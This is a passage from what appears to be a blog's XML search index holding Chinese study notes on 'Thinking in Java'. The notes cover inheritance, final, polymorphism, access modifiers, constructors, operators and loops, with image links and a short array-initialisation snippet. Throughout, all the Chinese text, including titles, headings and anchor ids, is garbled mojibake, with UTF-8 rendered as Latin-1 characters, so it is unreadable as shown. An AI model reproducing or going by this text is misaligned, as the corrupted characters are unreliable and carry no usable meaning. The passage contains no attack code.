å…³ç³»ï¼Œå³çˆ¶ç±»å’Œæ´¾ç”Ÿç±»åœ¨æ¦‚å¿µæœ¬è´¨ä¸Šåº”è¯¥æ˜¯ç›¸åŒçš„ã€‚å¯¹äºæ¥å£åˆ™ä¸ç„¶ï¼Œå¹¶ä¸è¦æ±‚æ¥å£çš„å®ç°è€…å’Œæ¥å£å®šä¹‰åœ¨æ¦‚å¿µæœ¬è´¨ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œ ä»…ä»…æ˜¯å®ç°äº†æ¥å£å®šä¹‰çš„è§„åˆ™è€Œå·²ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬7ç«  å¤ç”¨ç±»</title>
      <link href="/2021/06/11/%E7%AC%AC7%E7%AB%A0_%E5%A4%8D%E7%94%A8%E7%B1%BB/"/>
      <url>/2021/06/11/%E7%AC%AC7%E7%AB%A0_%E5%A4%8D%E7%94%A8%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="7-1-å½“éœ€è¦Stringæ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨toString"><a href="#7-1-å½“éœ€è¦Stringæ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨toString" class="headerlink" title="7.1 å½“éœ€è¦Stringæ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨toString()"></a>7.1 <strong>å½“éœ€è¦Stringæ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨toString()</strong></h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/187768/8/8156/173809/60c758caE0235709d/c47a625b496f5f12.jpg"></p><h2 id="7-2-å¯¼å‡ºç±»æ„é€ å™¨å’ŒåŸºç±»æ„é€ å™¨"><a href="#7-2-å¯¼å‡ºç±»æ„é€ å™¨å’ŒåŸºç±»æ„é€ å™¨" class="headerlink" title="7.2 å¯¼å‡ºç±»æ„é€ å™¨å’ŒåŸºç±»æ„é€ å™¨"></a>7.2 å¯¼å‡ºç±»æ„é€ å™¨å’ŒåŸºç±»æ„é€ å™¨</h2><p><strong>æ‰€æœ‰çš„ç±»éƒ½å¯ä»¥å«æœ‰mainæ–¹æ³•ï¼Œæ— éœ€åˆ é™¤ï¼Œæ–¹ä¾¿å•å…ƒæµ‹è¯•ã€‚</strong></p><ul><li><strong>åˆ›å»ºä»åŸºç±»ç»§æ‰¿çš„ç±»çš„å¯¹è±¡ä¼šå…ˆæ‰§è¡ŒåŸºç±»æ„é€ å™¨ï¼Œç„¶åå†æ‰§è¡Œç»§æ‰¿ç±»çš„æ„é€ å™¨<strong><strong>ï¼Œæ‰€ä»¥å¯¼å‡ºç±»æ„é€ å™¨ä¸­å¿…é¡»å¸¦æœ‰åŸºç±»æ„é€ å™¨</strong></strong>ã€‚</strong><ul><li><strong>è‹¥æƒ³è¦åœ¨ç»§æ‰¿ç±»ä¸­è°ƒç”¨åŸºç±»çš„å¸¦å‚æ•°çš„æ„é€ å™¨ï¼Œéœ€è¦ä½¿ç”¨superå…³é”®å­—****ã€‚</strong></li><li><img src="https://img14.360buyimg.com/ddimg/jfs/t1/193139/8/8169/55490/60c758e4E6a6e76af/a9bf8344bb31fa8d.jpg"><h2 id="7-6-protected-å…³é”®å­—"><a href="#7-6-protected-å…³é”®å­—" class="headerlink" title="7.6 protected å…³é”®å­—"></a>7.6 protected å…³é”®å­—</h2><img src="https://img11.360buyimg.com/ddimg/jfs/t1/187016/1/8186/58893/60c7591bEee00236c/a0654b60d7f66a72.jpg"><h2 id="7-7-å‘ä¸Šè½¬å‹"><a href="#7-7-å‘ä¸Šè½¬å‹" class="headerlink" title="7.7 å‘ä¸Šè½¬å‹"></a>7.7 å‘ä¸Šè½¬å‹</h2></li></ul></li></ul><p><strong>å¯¼å‡ºç±»å¯¹è±¡è‡ªåŠ¨æå‡åˆ°åŸºç±»å¯¹è±¡ï¼Œå‘ä¸Šè½¬å‹æ˜¯å®‰å…¨çš„ï¼Œåªä¼šä¸¢å¤±æ–¹æ³•ã€‚</strong><br><strong><img src="https://img10.360buyimg.com/ddimg/jfs/t1/184299/24/9164/118703/60c75937E35962a8e/609ac1042d2790ce.jpg"></strong><br>**</p><h3 id="7-7-2-å†è®ºç»§æ‰¿ä¸ç»„åˆ"><a href="#7-7-2-å†è®ºç»§æ‰¿ä¸ç»„åˆ" class="headerlink" title="7.7.2 å†è®ºç»§æ‰¿ä¸ç»„åˆ"></a>7.7.2 å†è®ºç»§æ‰¿ä¸ç»„åˆ</h3><p><strong>ä½¿ç”¨ç»§æ‰¿è¿˜æ˜¯ç»„åˆæœ€æ¸…æ™°çš„åŠæ³•å°±æ˜¯è¦ä¸è¦å‘ä¸Šè½¬å‹ã€‚å¦‚æœè¦å‘ä¸Šè½¬å‹ï¼Œé‚£ç»§æ‰¿æ˜¯å¿…è¦çš„ã€‚å¦‚æœä¸éœ€è¦ï¼Œå†å¥½å¥½è€ƒè™‘</strong>Â <strong>ã€‚</strong></p><h2 id="7-8-finalå…³é”®å­—"><a href="#7-8-finalå…³é”®å­—" class="headerlink" title="7.8 finalå…³é”®å­—"></a>7.8 finalå…³é”®å­—</h2><h3 id="7-8-1-final-æ•°æ®"><a href="#7-8-1-final-æ•°æ®" class="headerlink" title="7.8.1 final æ•°æ®"></a>7.8.1 final æ•°æ®</h3><ul><li><p><strong>è‹¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹åˆ™å€¼ä¸å˜</strong>Â ã€‚</p></li><li><p><strong>è‹¥æ˜¯å¯¹è±¡å¼•ç”¨åˆ™å¼•ç”¨ä¸å˜ï¼Œä¸€æ—¦è¢«åˆå§‹åŒ–ï¼Œåˆ™æ— æ³•å†æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡è‡ªèº«å¯ä»¥ä¿®æ”¹</strong>Â <strong>ã€‚</strong></p></li><li><p><strong>æ—¢æ˜¯staticåˆæ˜¯finalçš„å˜é‡ç”¨å¤§å†™è¡¨ç¤ºã€‚</strong></p><h3 id="final-å‚æ•°"><a href="#final-å‚æ•°" class="headerlink" title="final å‚æ•°"></a>final å‚æ•°</h3></li><li><p><strong>æ–¹æ³•çš„å‚æ•°åˆ—è¡¨æŒ‡å®šä¸ºfinalã€‚åŸºæœ¬æ•°æ®ç±»å‹å€¼ä¸èƒ½ä¿®æ”¹ï¼Œå¼•ç”¨å¯¹è±¡ä¸èƒ½æ›´æ¢æŒ‡å‘ã€‚</strong></p><h3 id="7-8-2-final-æ–¹æ³•"><a href="#7-8-2-final-æ–¹æ³•" class="headerlink" title="7.8.2 final æ–¹æ³•"></a>7.8.2 final æ–¹æ³•</h3></li><li><p><strong>finalæ–¹æ³•ä¸èƒ½é‡å†™</strong>Â <strong>ã€‚</strong></p></li><li><p><strong>privateæ–¹æ³•å·²ç»éšå¼çš„æŒ‡å®šä¸ºfinalï¼Œä¸èƒ½é‡å†™ã€‚</strong></p></li><li><p>finalæ–¹æ³•å¯ä»¥å…³é—­åŠ¨æ€ç»‘å®šÂ ã€‚</p><h3 id="7-8-3-final-ç±»"><a href="#7-8-3-final-ç±»" class="headerlink" title="7.8.3 final ç±»"></a>7.8.3 final ç±»</h3></li><li><p><strong>finalç±»ä¸èƒ½ç»§æ‰¿</strong>Â <strong>ã€‚</strong></p></li><li><p>finalç±»ä¸­çš„å˜é‡å¯ä»¥é€‰æ‹©finalæˆ–è€…ä¸finalï¼Œä½†æ˜¯æ–¹æ³•ä¸èƒ½é‡å†™Â ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬8ç«  å¤šæ€</title>
      <link href="/2021/06/11/%E7%AC%AC8%E7%AB%A0_%E5%A4%9A%E6%80%81/"/>
      <url>/2021/06/11/%E7%AC%AC8%E7%AB%A0_%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h2 id="8-2-ç»‘å®š"><a href="#8-2-ç»‘å®š" class="headerlink" title="8.2 ç»‘å®š"></a>8.2 ç»‘å®š</h2><p><strong>é™æ€ç»‘å®šå’ŒåŠ¨æ€ç»‘å®š</strong></p><ul><li><strong>ç»‘å®šï¼šä¸€ä¸ªæ–¹æ³•çš„è°ƒç”¨ä¸æ–¹æ³•æ‰€åœ¨çš„ç±»å…³è”èµ·æ¥ã€‚</strong></li><li><strong>é™æ€ç»‘å®šï¼šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°±å·²ç»çŸ¥é“è¿™ä¸ªæ–¹æ³•åˆ°åº•æ˜¯å“ªä¸ªç±»ä¸­çš„æ–¹æ³•ã€‚</strong></li><li><strong>åŠ¨æ€ç»‘å®šï¼šè¿è¡Œæ—¶æ ¹æ®å¯¹è±¡çš„ç±»è¿›è¡Œç»‘å®šã€‚</strong></li></ul><p><strong>javaä¸­é™¤äº†staticå’Œfinalæ–¹æ³•ï¼ˆåŒ…æ‹¬privateï¼‰ï¼Œå…¶ä»–æ–¹æ³•éƒ½æ˜¯åŠ¨æ€ç»‘å®š</strong>Â <strong>ã€‚</strong></p><h3 id="8-2-1-å‘ä¸Šè½¬å‹"><a href="#8-2-1-å‘ä¸Šè½¬å‹" class="headerlink" title="8.2.1 å‘ä¸Šè½¬å‹"></a>8.2.1 å‘ä¸Šè½¬å‹</h3><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/185948/12/9082/119939/60c7597dE1e65c954/7e73954f040131b6.jpg">Â <br>Â Â <strong>s.draw()è°ƒç”¨çš„æ˜¯circleçš„draw()</strong></p><ul><li><strong>å¤šæ€ = å‘ä¸Šè½¬å‹ = åŠ¨æ€ç»‘å®šÂ ã€‚</strong><ul><li><strong>é™æ€æ–¹æ³•ä¸å…·æœ‰å¤šæ€æ€§</strong>Â ã€‚<img src="https://img14.360buyimg.com/ddimg/jfs/t1/137541/24/19032/220254/60c759bbE03940af0/571a93e46206a98c.jpg"></li></ul></li></ul><h2 id="8-3-å¸¦mainæ–¹æ³•çš„ç±»æ„é€ å™¨ç»§æ‰¿è°ƒç”¨é¡ºåº"><a href="#8-3-å¸¦mainæ–¹æ³•çš„ç±»æ„é€ å™¨ç»§æ‰¿è°ƒç”¨é¡ºåº" class="headerlink" title="8.3 å¸¦mainæ–¹æ³•çš„ç±»æ„é€ å™¨ç»§æ‰¿è°ƒç”¨é¡ºåº"></a>8.3 å¸¦mainæ–¹æ³•çš„ç±»æ„é€ å™¨ç»§æ‰¿è°ƒç”¨é¡ºåº</h2><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189817/35/8121/74886/60c75a10E93f2cc8c/dc80047544e3a2fb.jpg"><br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180763/28/9192/151689/60c75a29E195d704b/2c878cc1a1720461.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬6ç«  è®¿é—®æƒé™æ§åˆ¶</title>
      <link href="/2021/06/10/%E7%AC%AC6%E7%AB%A0_%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/"/>
      <url>/2021/06/10/%E7%AC%AC6%E7%AB%A0_%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181179/18/9114/48938/60c7583eE281939e9/7e2ddeae94364274.jpg"></p><ul><li><strong>publicï¼šå¯ä»¥è¢«æ‰€æœ‰å…¶ä»–ç±»æ‰€è®¿é—®ã€‚</strong></li><li><strong>privateï¼šåªèƒ½è¢«è‡ªå·±è®¿é—®å’Œä¿®æ”¹ã€‚</strong></li><li><strong>protectedï¼šè‡ªèº«ã€å­ç±»åŠåŒä¸€ä¸ªåŒ…ä¸­ç±»å¯ä»¥è®¿é—®ã€‚</strong></li><li><strong>defaultï¼šåŒä¸€åŒ…ä¸­çš„ç±»å¯ä»¥è®¿é—®ï¼Œå£°æ˜æ—¶æ²¡æœ‰åŠ ä¿®é¥°ç¬¦ï¼Œè®¤ä¸ºæ˜¯friendlyã€‚</strong></li><li><strong>ä¸ºäº†ç»§æ‰¿ï¼Œé€šå¸¸æŠŠæ•°æ®æŒ‡å®šä¸ºprivateï¼Œæ–¹æ³•ä¸ºpublic</strong>Â <strong>ã€‚</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬4ç«  æ§åˆ¶æ‰§è¡Œæµç¨‹</title>
      <link href="/2021/06/07/%E7%AC%AC4%E7%AB%A0_%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
      <url>/2021/06/07/%E7%AC%AC4%E7%AB%A0_%E6%8E%A7%E5%88%B6%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="4-4-foreachä¸forå¾ªç¯"><a href="#4-4-foreachä¸forå¾ªç¯" class="headerlink" title="4.4 foreachä¸forå¾ªç¯"></a>4.4 foreachä¸forå¾ªç¯</h2><ul><li><strong>foreachå’Œforå¾ªç¯åœ¨æ•°ç»„éå†ä¸Šï¼Œé€Ÿåº¦ç›¸å½“ï¼Œforå¾ªç¯ç¨å¿«ã€‚</strong></li><li><strong>åœ¨é“¾è¡¨éå†ä¸Šï¼Œforeachæ¯”forå¾ªç¯å¿«å¾ˆå¤šã€‚</strong></li><li><strong>foreachä¸èƒ½æ’å…¥å’Œåˆ é™¤æ“ä½œã€‚</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬5ç«  åˆå§‹åŒ–ä¸æ¸…ç†</title>
      <link href="/2021/06/07/%E7%AC%AC5%E7%AB%A0_%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E6%B8%85%E7%90%86/"/>
      <url>/2021/06/07/%E7%AC%AC5%E7%AB%A0_%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E6%B8%85%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="5-1-æ„é€ å™¨"><a href="#5-1-æ„é€ å™¨" class="headerlink" title="5.1 æ„é€ å™¨"></a>5.1 æ„é€ å™¨</h2><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/186178/13/9202/31200/60c757f8E20e3c80e/ae27efe8cf40900e.jpg"></p><h2 id="5-2-é‡è½½"><a href="#5-2-é‡è½½" class="headerlink" title="5.2 é‡è½½"></a>5.2 é‡è½½</h2><ul><li><strong>é‡è½½æ–¹æ³•å¿…é¡»æ‹¥æœ‰ç‹¬ä¸€æ— äºŒçš„å‚æ•°åˆ—è¡¨ï¼Œè¿”å›å€¼ä¸åŒä¸èƒ½ä½œä¸ºåŒºåˆ†é‡è½½çš„æ ‡å¿—ã€‚</strong></li><li><strong>ä¼ å…¥æ•°æ®ç±»å‹å°äºæ–¹æ³•ä¸­çš„å‚æ•°ç±»å‹ï¼Œä¼šè‡ªåŠ¨æå‡ã€‚å¦‚æœæ²¡æœ‰charç±»å‹ï¼Œä¼šè‡ªåŠ¨æå‡åˆ°intå‹ã€‚</strong></li><li><strong>ä¼ å…¥æ•°æ®ç±»å‹å¤§äºæ–¹æ³•ä¸­çš„å‚æ•°ç±»å‹ï¼Œå¿…é¡»å¼ºåˆ¶è½¬æ¢ã€‚</strong></li></ul><blockquote><h3 id="é‡è½½å’Œé‡å†™çš„åŒºåˆ«"><a href="#é‡è½½å’Œé‡å†™çš„åŒºåˆ«" class="headerlink" title="é‡è½½å’Œé‡å†™çš„åŒºåˆ«"></a>é‡è½½å’Œé‡å†™çš„åŒºåˆ«</h3><ul><li><strong>é‡è½½ï¼šåœ¨åŒä¸€ä¸ªç±»ä¸­ç›¸åŒåå­—çš„æ–¹æ³•ï¼Œå‚æ•°åˆ—è¡¨ä¸åŒã€‚</strong></li><li><strong>é‡å†™ï¼šå­ç±»å¯¹çˆ¶ç±»çš„å…è®¸è®¿é—®çš„æ–¹æ³•çš„å®ç°è¿‡ç¨‹è¿›è¡Œé‡æ–°ç¼–å†™, è¿”å›å€¼å’Œå½¢å‚éƒ½ä¸èƒ½æ”¹å˜ã€‚é€šè¿‡å­ç±»åˆ›å»ºçš„å®ä¾‹å¯¹è±¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œå°†è°ƒç”¨å­ç±»ä¸­çš„å®šä¹‰æ–¹æ³•ï¼Œè¿™ç›¸å½“äºæŠŠçˆ¶ç±»ä¸­å®šä¹‰çš„é‚£ä¸ªå®Œå…¨ç›¸åŒçš„æ–¹æ³•ç»™è¦†ç›–äº†ã€‚</strong></li></ul></blockquote><h2 id="5-3-é»˜è®¤æ„é€ å™¨"><a href="#5-3-é»˜è®¤æ„é€ å™¨" class="headerlink" title="5.3 é»˜è®¤æ„é€ å™¨"></a>5.3 é»˜è®¤æ„é€ å™¨</h2><ul><li><strong>æ²¡æœ‰å†™æ„é€ å™¨ä¼šè‡ªåŠ¨åˆ›å»ºæ— å‚æ„é€ å™¨ã€‚</strong></li><li><strong>å†™äº†æ„é€ å™¨ï¼Œå°±ä¸ä¼šè‡ªåŠ¨åˆ›å»ºæ„é€ å™¨ã€‚</strong></li></ul><h2 id="5-4-thiså…³é”®å­—"><a href="#5-4-thiså…³é”®å­—" class="headerlink" title="5.4 thiså…³é”®å­—"></a>5.4 thiså…³é”®å­—</h2><ul><li><strong>åœ¨æ–¹æ³•å†…éƒ¨ä½¿ç”¨ï¼Œè¡¨ç¤ºè°ƒç”¨è¯¥æ–¹æ³•çš„é‚£ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</strong></li><li><strong>åœ¨æ–¹æ³•ä¸­è°ƒç”¨åŒä¸€ä¸ªç±»çš„å¦ä¸€ä¸ªæ–¹æ³•ä¸éœ€è¦ç”¨thisï¼Œåªæœ‰å½“éœ€è¦æ˜ç¡®æŒ‡å‡ºå¯¹å½“å‰å¯¹è±¡çš„å¼•ç”¨æ—¶æ‰ç”¨thisã€‚</strong><ul><li><strong>ä¾‹å¦‚return this æˆ–è€…ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¤–éƒ¨å‡½æ•°ã€‚</strong></li></ul></li><li><strong>åœ¨æ„é€ å™¨ä¸­ä½¿ç”¨thisè°ƒç”¨å¦ä¸€ä¸ªæ„é€ å™¨ã€‚</strong></li></ul><h2 id="5-7-åˆå§‹åŒ–é¡ºåº"><a href="#5-7-åˆå§‹åŒ–é¡ºåº" class="headerlink" title="5.7 åˆå§‹åŒ–é¡ºåº"></a>5.7 åˆå§‹åŒ–é¡ºåº</h2><ul><li><strong>é™æ€å˜é‡ï¼ˆåªåˆå§‹åŒ–ä¸€æ¬¡ï¼‰-ã€‹éé™æ€å˜é‡-ã€‹æ„é€ å™¨</strong></li></ul><h2 id="5-8-æ•°ç»„åˆå§‹åŒ–"><a href="#5-8-æ•°ç»„åˆå§‹åŒ–" class="headerlink" title="5.8 æ•°ç»„åˆå§‹åŒ–"></a>5.8 æ•°ç»„åˆå§‹åŒ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ•°ç»„åˆå§‹åŒ–ä¸‰ç§å½¢å¼</span></span><br><span class="line"><span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#125;;</span><br><span class="line"><span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-8-1-å¯å˜å‚æ•°åˆ—è¡¨"><a href="#5-8-1-å¯å˜å‚æ•°åˆ—è¡¨" class="headerlink" title="5.8.1 å¯å˜å‚æ•°åˆ—è¡¨"></a>5.8.1 å¯å˜å‚æ•°åˆ—è¡¨</h3><ul><li><strong>ç”¨Objectæ•°ç»„æˆ–Objectâ€¦ argsä½œä¸ºå‚æ•°å³å¯ã€‚</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬3ç«  æ“ä½œç¬¦</title>
      <link href="/2021/06/06/%E7%AC%AC3%E7%AB%A0_%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2021/06/06/%E7%AC%AC3%E7%AB%A0_%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="3-2-å’Œequals"><a href="#3-2-å’Œequals" class="headerlink" title="3.2 ==å’Œequals"></a>3.2 ==å’Œequals</h2><ul><li><p><strong>==çš„å«ä¹‰ï¼š</strong></p><ul><li><strong>æ¯”è¾ƒåŸºæœ¬æ•°æ®ç±»å‹çš„å€¼æ˜¯å¦ç›¸åŒã€‚</strong></li><li><strong>æ¯”è¾ƒå¼•ç”¨æ•°æ®ç±»å‹çš„åœ°å€æ˜¯å¦ç›¸åŒã€‚</strong></li></ul></li><li><p><strong>equalsçš„å«ä¹‰ï¼š</strong></p><ul><li><strong>Objectä¸­çš„equalså’Œ==ä¸€æ ·ï¼Œéƒ½æ˜¯æ¯”è¾ƒå¯¹è±¡çš„åœ°å€ã€‚</strong></li><li><strong>Stringåœ¨Objectçš„åŸºç¡€ä¸Šé‡å†™äº†equalsï¼Œæ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²çš„å†…å®¹ã€‚</strong></li></ul></li><li><p><strong>Stringçš„equalsæºç </strong><br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/182134/35/9178/113522/60c757a1Ed15aa1e2/f61d1016c4fe6fcb.jpg">Â </p><h2 id="3-15-ç±»å‹è½¬æ¢"><a href="#3-15-ç±»å‹è½¬æ¢" class="headerlink" title="3.15 ç±»å‹è½¬æ¢"></a>3.15 ç±»å‹è½¬æ¢</h2></li><li><p><strong>ç¼–è¯‘å™¨ä¼šåœ¨å¿…è¦çš„æ—¶å€™è‡ªåŠ¨å°†intè½¬æ¢åˆ°longã€‚</strong></p></li><li><p><strong>å°æ•°æ®ç±»å‹ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºå¤§æ•°æ®ç±»å‹ã€‚</strong></p><ul><li><strong>å¦‚ï¼šcharã€byteã€shortåœ¨è¿ç®—æ—¶ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºintã€‚</strong></li></ul></li><li><p><strong>å¤§æ•°æ®ç±»å‹åˆ°å°æ•°æ®ç±»å‹éœ€è¦å¼ºåˆ¶è½¬æ¢ã€‚</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬1ç«  å¯¼è®º</title>
      <link href="/2021/06/05/%E7%AC%AC1%E7%AB%A0_%E5%AF%BC%E8%AE%BA/"/>
      <url>/2021/06/05/%E7%AC%AC1%E7%AB%A0_%E5%AF%BC%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h2><p><strong>æ¯ä¸€ä¸ªå¯¹è±¡åœ¨å†…å­˜ä¸­éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€ï¼Œnewçš„å¯¹è±¡åœ¨å †ä¸­ã€‚</strong></p><h2 id="1-3"><a href="#1-3" class="headerlink" title="1.3"></a>1.3</h2><p><strong>é«˜å†…èšã€ä½è€¦åˆï¼šæ¨¡å—ä¹‹é—´ç´§å¯†è”ç³»ï¼Œå¹¶ä¸”ä¿æŒç‹¬ç«‹æ€§ã€‚</strong></p><h2 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h2><ul><li><strong>publicã€privateã€protected</strong><ul><li><strong>private: é™¤ç±»å‹åˆ›å»ºè€…å’Œç±»å‹çš„å†…éƒ¨æ–¹æ³•ä¹‹å¤–çš„ä»»ä½•äººéƒ½ä¸èƒ½è®¿é—®ã€‚</strong></li><li><strong>protectedï¼šä¸ privateä½œç”¨ç›¸å½“ï¼Œå·®åˆ«ä»…åœ¨äºç»§æ‰¿çš„ç±»å¯ä»¥è®¿é—® protectedæˆå‘˜ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®privateæˆå‘˜ã€‚</strong></li></ul></li></ul><h2 id="1-5-ç»„åˆ"><a href="#1-5-ç»„åˆ" class="headerlink" title="1.5 ç»„åˆ"></a>1.5 ç»„åˆ</h2><ul><li><strong>ç»„åˆï¼šç”±ç±»çš„å¯¹è±¡ç»„åˆæˆæ–°ç±»</strong>ã€‚<ul><li><strong>has-aï¼ˆæ‹¥æœ‰ï¼‰å…³ç³»çš„æ—¶å€™ç”¨ç»„åˆ</strong>Â <strong>ã€‚</strong></li><li><strong>æ–°ç±»çš„æˆå‘˜å¯¹è±¡é€šå¸¸éƒ½è¢«å£°æ˜ä¸º privateï¼Œä½¿å¾—å¯ä»¥åœ¨ä¸å¹²æ‰°ç°æœ‰å®¢æˆ·ç«¯ä»£ç çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹è¿™äº›æˆå‘˜ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶ä¿®æ”¹è¿™äº›æˆå‘˜å¯¹è±¡ï¼Œä»¥å®ç°åŠ¨æ€ä¿®æ”¹ç¨‹åºçš„è¡Œä¸ºã€‚</strong></li><li><strong>é€šå¸¸ç”¨äºåœ¨æ–°ç±»ä¸­ä½¿ç”¨ç°æœ‰ç±»çš„åŠŸèƒ½è€Œéæ¥å£çš„æƒ…å†µï¼Œå³åœ¨æ–°ç±»ä¸­åµŒå…¥ç°æœ‰ç±»çš„privateå¯¹è±¡</strong>Â <strong>ã€‚</strong></li></ul></li></ul><h2 id="1-6-ç»§æ‰¿"><a href="#1-6-ç»§æ‰¿" class="headerlink" title="1.6 ç»§æ‰¿"></a>1.6 ç»§æ‰¿</h2><p><strong>is-aï¼ˆæ˜¯ä¸€ä¸ªï¼‰æˆ–è€…like-aï¼ˆåƒæ˜¯ä¸€ä¸ªï¼‰çš„æ—¶å€™ç”¨ç»§æ‰¿</strong>Â <strong>ã€‚</strong><br><strong>æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ä½¿åŸºç±»ä¸å¯¼å‡ºç±»äº§ç”Ÿå·®å¼‚ï¼šextendså…³é”®å­—ã€è¦†ç›–åŸºç±»çš„æ–¹æ³•ã€‚</strong><br><strong>åˆ¤æ–­ç”¨ç»„åˆè¿˜æ˜¯ç»§æ‰¿ï¼Œå…ˆçœ‹çœ‹è¦ä¸è¦å‘ä¸Šè½¬å‹</strong>Â ã€‚</p><h2 id="1-8"><a href="#1-8" class="headerlink" title="1.8"></a>1.8</h2><p><strong>æ‰€æœ‰ç±»ç»§æ‰¿äºObjectã€‚</strong><br><strong>æ‰€æœ‰å¯¹è±¡éƒ½åœ¨å †ä¸Šåˆ›å»ºï¼ˆnewï¼‰ã€‚</strong></p><h2 id="1-10-ç”Ÿå‘½å‘¨æœŸ"><a href="#1-10-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="1.10 ç”Ÿå‘½å‘¨æœŸ"></a>1.10 ç”Ÿå‘½å‘¨æœŸ</h2><ul><li><strong>javaå®Œå…¨é‡‡ç”¨åŠ¨æ€å†…å­˜åˆ†é…æ–¹å¼ã€‚</strong><ul><li><strong>åœ¨å †æ ˆä¸Šåˆ›å»ºå¯¹è±¡ï¼Œç¼–è¯‘å™¨å¯ä»¥ç¡®å®šå¯¹è±¡å­˜æ´»æ—¶é—´ï¼Œè‡ªåŠ¨é”€æ¯ã€‚ä½†æ˜¯åœ¨å †ä¸Šåˆ›å»ºå¯¹è±¡ï¼Œç¼–è¯‘å™¨å¯¹å…¶ç”Ÿå‘½å‘¨æœŸä¸€æ— æ‰€çŸ¥</strong>ã€‚</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaç¼–ç¨‹æ€æƒ³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬2ç«  å¯¹è±¡</title>
      <link href="/2021/06/05/%E7%AC%AC2%E7%AB%A0_%E5%AF%B9%E8%B1%A1/"/>
      <url>/2021/06/05/%E7%AC%AC2%E7%AB%A0_%E5%AF%B9%E8%B1%A1/</url>
      
